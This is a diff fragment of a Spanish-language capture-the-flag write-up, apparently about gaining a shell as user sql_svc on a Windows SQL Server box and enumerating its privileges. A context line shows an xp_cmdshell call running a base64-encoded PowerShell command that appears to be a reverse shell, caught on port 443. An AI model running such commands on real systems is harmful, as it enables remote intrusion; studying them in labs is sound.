@@ -221,5 +221,14 @@ xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC
 Y nos ponemos en escucha por el puerto `443` con pnelope y obtemeos una shell como usuario `sql_svc`
 
 ### Shell sql_svc
+Enumeramos los privilegios de nuestro usuario
+```shell
+whoami /priv
+```
 
+Vemos que tenemos habilitados los permisos
+```shell
+SeChangeNotifyPrivilege      
+SeCreateGlobalPrivilege      
+```
 
